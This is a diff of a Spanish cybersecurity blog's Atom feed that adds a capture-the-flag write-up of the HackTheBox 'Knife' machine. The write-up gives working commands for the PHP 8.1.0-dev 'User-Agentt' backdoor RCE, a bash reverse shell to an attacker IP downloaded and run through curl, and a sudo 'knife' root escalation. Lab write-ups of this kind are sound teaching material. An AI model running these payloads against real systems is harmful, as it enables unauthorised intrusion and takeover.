@@ -1,4 +1,204 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-04-11T20:48:11-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">THM Spring4Shell</title><link href="http://localhost:4000/spring4shell/" rel="alternate" type="text/html" title="THM Spring4Shell" /><published>2022-04-10T00:00:00-05:00</published><updated>2022-04-10T00:00:00-05:00</updated><id>http://localhost:4000/spring4shell</id><content type="html" xml:base="http://localhost:4000/spring4shell/">&lt;p align=&quot;center&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-04-28T23:45:21-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">HTB Knife</title><link href="http://localhost:4000/knife/" rel="alternate" type="text/html" title="HTB Knife" /><published>2022-04-28T00:00:00-05:00</published><updated>2022-04-28T00:00:00-05:00</updated><id>http://localhost:4000/knife</id><content type="html" xml:base="http://localhost:4000/knife/">&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/knife/01inicio.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;¡Hola!
+En esta ocasión vamos a resolver de la maquina &lt;strong&gt;Knife&lt;/strong&gt; de &lt;a href=&quot;https://app.hackthebox.com/&quot;&gt;HackTheBox&lt;/a&gt;.
+La maquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!&lt;/p&gt;
+
+&lt;h2 id=&quot;preparación&quot;&gt;PREPARACIÓN&lt;/h2&gt;
+
+&lt;p&gt;Para iniciar nuestra máquina, vamos a crear un directorio de trabajo con el nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;knife&lt;/code&gt; y los subdirectorios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; junto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;, con el objetivo de organizar la información que recopilemos en la realización de la máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;knife
+❯ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;knife
+❯ &lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;nmap exploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;reconocimiento&quot;&gt;RECONOCIMIENTO&lt;/h2&gt;
+
+&lt;p&gt;Accedemos al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de una traza &lt;strong&gt;ICMP&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.242 | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;ttl | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $4,$6}'&lt;/span&gt;
+10.10.10.242: &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Identificamos que es una maquina &lt;strong&gt;Linux&lt;/strong&gt; debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTheBox).&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;TTL =&amp;gt; 64	Linux&lt;/li&gt;
+  &lt;li&gt;TTL =&amp;gt; 128	Windows&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Continuamos con la enumeración de los &lt;strong&gt;65535&lt;/strong&gt; puertos en la máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.242 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; openPorts | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;open
+22/tcp open  ssh
+80/tcp open  http
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Luego de identificar los puertos abiertos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OPEN&lt;/code&gt;, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; 10.10.10.242 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; deepScan
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-04-17 13:38 &lt;span class=&quot;nt&quot;&gt;-05&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.242
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.090s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-title:  Emergent Medical Idea
+|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Podemos identificar que el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; tiene una página web en servicio, por lo que revisamos con el explorador la página en cuestión.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/knife/03page.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Vamos a realizar un &lt;strong&gt;fuzzing&lt;/strong&gt; por medio de la generación de múltiples peticiones con diferentes terminaciones a la página web, con el fin de detectar rutas de acceso a información o explotación, sin embargo, no es posible la extracción de información que fuera de ayuda para el ejercicio (solo muestro el comando para fines educativos).&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.242/FUZZ
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación, vamos a realizar la enumeración de software utilizado para la creación de la página web a través de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.242/
+http://10.10.10.242/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.242], PHP[8.1.0-dev], Scrip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Como se puede ver, tenemos la versión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PHP 8.1.0-dev&lt;/code&gt;, la cual vamos a buscar en la base de datos de exploits por medio de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit PHP 8.1.0-dev | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;dev
+PHP 8.1.0-dev - &lt;span class=&quot;s1&quot;&gt;'User-Agentt'&lt;/span&gt; Remote Code Execution	| php/webapps/49933.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Encontramos un exploit que genera un backdoor por medio de una modificación en las cabeceras de la petición web, todo esto por con el fin de lograr un RCE (Remote Command Excecution).&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;&quot;User-Agentt: zerodiumsystem ('whoami');&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACIÓN&lt;/h2&gt;
+
+&lt;p&gt;Bien, ahora que tenemos conocimiento de esta vulnerabilidad, vamo a probar en la maquina victima por medio de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; que nos permite modificar parámetros como en este caso el &lt;strong&gt;User Agent&lt;/strong&gt; (Entramos a la carpeta exploit antes de ejecutar nuestra prueba).&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../exploit
+❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET http://10.10.10.242/ &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User-Agentt: zerodiumsystem ('whoami');&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1
+james
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;¡Tenemos ejecución remota de comandos! Podemos ver que el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;james&lt;/code&gt; es un usuario de la maquina víctima.&lt;/p&gt;
+
+&lt;p&gt;Vamos a generar una reverse shell en bash para cargarla y después ejecutarla en la máquina, para esto creamos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;escalation.sh&lt;/code&gt; con el siguiente contenido.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;escalation.sh
+&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.12/5555 0&amp;gt;&amp;amp;1'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora que tenemos nuestra reverse shell, vamos a iniciar en nuestra maquina un servidor web con ayuda de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server
+Serving HTTP on 0.0.0.0 port 8000 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:8000/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Luego de tener nuestro servidor activo, generamos una petición al servidor web victima por medio del exploit encontrado anteriormente, en esta ocasión para &lt;strong&gt;subir&lt;/strong&gt; el archivo en la maquina vulnerable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET http://10.10.10.242/ &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'User-Agentt: zerodiumsystem(&quot; curl http://10.10.14.12:8000/escalation.sh -o /tmp/escalation.sh &quot;);'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Al tener la reverse shell solo queda ejecutarlo, sin embargo, antes de ejecutar el comando es necesario ponerse en escucha por el puerto que se indicó al momento de configurar la reverse shell, para este caso es el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5555&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 5555
+Ncat: Version 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org/ncat &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Ncat: Listening on :::5555
+Ncat: Listening on 0.0.0.0:5555
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Finalmente ejecutamos el comando para accionar la reverse shell desde la maquina víctima.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET http://10.10.10.242/ &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'User-Agentt: zerodiumsystem(&quot; bash /tmp/escalation.sh &quot;);'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vamos a verlo en acción.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/knife/04intrusion.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;¡Obtenemos acceso a la maquina!&lt;/p&gt;
+
+&lt;p&gt;El primer paso luego de obtener una shell es realizar el tratamiento de la TTY, por lo que dejare el procedimiento de cómo realizarlo (Esto se hace inicialmente en la maquina a la cual tenemos acceso).&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;script /dev/null &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; bash
+^Z
+&lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;raw &lt;span class=&quot;nt&quot;&gt;-echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fg
+&lt;/span&gt;reset
+xterm
+&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;XTERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm
+&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora que estamos dentro de la maquina con el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;james&lt;/code&gt;, vamos a escalar privilegios para lograr ser &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, pero antes de eso vamos a leer la flag del usuario.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;james@knife:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; user.txt 2&amp;gt;/dev/null
+./home/james/user.txt
+james@knife:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 10 ./home/james/user.txt&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo
+&lt;/span&gt;b2bf0e7aa5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;escalamiento&quot;&gt;ESCALAMIENTO&lt;/h2&gt;
+
+&lt;p&gt;¡Perfecto! Ahora si vamos a revisar permisos por medio del comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;, así podremos ver qué tipo de utilidades puede ejecutar el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;james&lt;/code&gt; con privilegios.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;james@knife:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;james on knife:
+    env_reset, mail_badpass,
+    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin
+
+User james may run the following commands on knife:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/knife
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;james&lt;/code&gt; puede ejecutar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;knife&lt;/code&gt; sin necesidad de ingresar credenciales.&lt;/p&gt;
+
+&lt;p&gt;Por medio del recurso &lt;a href=&quot;https://gtfobins.github.io/gtfobins/knife/&quot;&gt;GTFOBins&lt;/a&gt; identificamos una vía potencial de escalamiento de privilegios, ejecutando lo siguiente.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;knife &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'exec &quot;/bin/sh&quot;'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Procedemos a realizar la prueba en nuestra maquina vulnerada.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;james@knife:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;knife &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'exec &quot;/bin/sh&quot;'&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
+root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;¡Logramos tener acceso a la maquina como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;!&lt;/p&gt;
+
+&lt;p&gt;Solo hace falta buscar la flag correspondiente y eso sería todo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# find . -name root.txt 2&amp;gt;/dev/null&lt;/span&gt;
+./root/root.txt
+&lt;span class=&quot;c&quot;&gt;# head -c 10 ./root/root.txt ; echo&lt;/span&gt;
+4b01b07a6d
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;¡Hemos logrado nuestra primera maquina del blog en HackTheBox!&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/knife/05finish.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Por último, les recomiendo seguir &lt;strong&gt;practicando&lt;/strong&gt; y si pueden generar contenido, mucho mejor! Espero les pueda servir de algo este material.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>Bast1ant1c</name></author><category term="Writeup" /><category term="Knife" /><summary type="html">Vamos a resolver la maquina Knife de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">THM Spring4Shell</title><link href="http://localhost:4000/spring4shell/" rel="alternate" type="text/html" title="THM Spring4Shell" /><published>2022-04-13T00:00:00-05:00</published><updated>2022-04-13T00:00:00-05:00</updated><id>http://localhost:4000/spring4shell</id><content type="html" xml:base="http://localhost:4000/spring4shell/">&lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/spring4shell/inicio.png&quot; /&gt;
 &lt;/p&gt;
 
